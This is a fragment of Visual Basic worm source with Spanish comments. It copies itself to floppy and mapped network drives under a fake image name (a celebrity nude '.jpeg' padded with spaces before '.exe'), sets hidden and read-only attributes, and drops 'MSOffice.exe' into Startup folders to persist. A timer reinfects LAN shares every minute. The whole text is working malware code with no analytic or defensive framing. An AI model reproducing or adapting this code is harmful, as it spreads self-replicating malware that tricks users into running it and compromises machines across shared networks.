   Fso.CopyFile MiNombreEXE, "A:\Abril Lavigne Nude.jpeg                                     .exe", True
   Fso.CopyFile DirWin & "\Web\Folder.htt", "A:\Folder.htt", True
   Fso.CopyFile DirWin & "\Web\Desktop.ini", "A:\Desktop.ini", True
   SetAttr "A:\Abril Lavigne Nude.jpeg                                     .exe", vbReadOnly 'Cambiamos las propiedades, a solo lectura
   SetAttr "A:\Desktop.ini", vbHidden
   SetAttr "A:\Folder.htt", vbHidden
   End If
   End Sub
   Private Sub CruxNET()
   On Error Resume Next
   Dim ColDrives As Object, strDes As String
   Set ColDrives = WsNet.EnumNetworkDrives 'Enumeramos los discos remotos
   If ColDrives.Count <> 0 Then 'Si por lo menos hay uno, proseguimos
   For i = 0 To ColDrives.Count - 1 Step 2 'Vamos de uno en uno
   strDes = ColDrives(i) & ColDrives(i + 1)
   If strDes <> "" Then Call CopiarARed(MiNombreEXE, strDes) 'Llamamos a otra funcion, pasandole como parametro la ruta remota
   Next
   End If
   End Sub
   Private Sub CopiarARed(strOrigen As String, strDestino As String)
   On Error Resume Next
   If Not Fso.FileExists(strOrigen) Then Exit Sub 'Si no existimos, tonces ¿pa que seguimos?
   Fso.CopyFile strOrigen, strDestino, True 'Nos copiamos en la ruta
   If Fso.FolderExists(strDestino & "\Windows\Menú Inicio\Programas\Inicio") Then 'Tratamos de arrancar cuando reinicien
   Fso.CopyFile strOrigen, strDestino & "\Windows\Menú Inicio\Programas\Inicio\MSOffice.exe", True
   End If
   If Fso.FolderExists(strDestino & "\Winnt\Menú Inicio\Programas\Inicio") Then 'Tratamos de arrancar cuando reinicien
   Fso.CopyFile strOrigen, strDestino & "\Winnt\Menú Inicio\Programas\Inicio\MSOffice.exe", True
   End If
   If Fso.FolderExists(strDestino & "\Windows\Start Menu\Programs\StartUp") Then
   Fso.CopyFile strOrigen, strDestino & "\Windows\Start Menu\Programs\StartUp\MSOffice.exe", True
   End If
   If Fso.FolderExists(strDestino & "\Winnt\Start Menu\Programs\StartUp") Then
   Fso.CopyFile strOrigen, strDestino & "\Winnt\Start Menu\Programs\StartUp\MSOffice.exe", True
   End If
   If Fso.FolderExists(strDestino & "\Windows\Escritorio") Then
   Fso.CopyFile strOrigen, strDestino & "\Windows\Escritorio\Abril Lavigne Nude.jpeg                                                                    .exe", True
   Fso.CopyFile DirWin & "\Web\Folder.htt", strDestino & "\Windows\Web\Folder.htt", True
   Fso.CopyFile DirWin & "\Web\Desktop.ini", strDestino & "\Windows\Web\Desktop.ini", True
   End If
   If Fso.FolderExists(strDestino & "\Winnt\Escritorio") Then
   Fso.CopyFile strOrigen, strDestino & "\Winnt\Escritorio\Abril Lavigne Nude.jpeg                                                                    .exe", True
   Fso.CopyFile DirWin & "\Web\Folder.htt", strDestino & "\Winnt\Web\Folder.htt", True
   Fso.CopyFile DirWin & "\Web\Desktop.ini", strDestino & "\Winnt\Web\Desktop.ini", True
   End If
   End Sub

   Private Sub TimerCruxNET_Timer()
   Call CruxNET 'Llamamos a la función que infecta las redes LAN cada 1 min.
   Call CoPiArMe
   End Sub
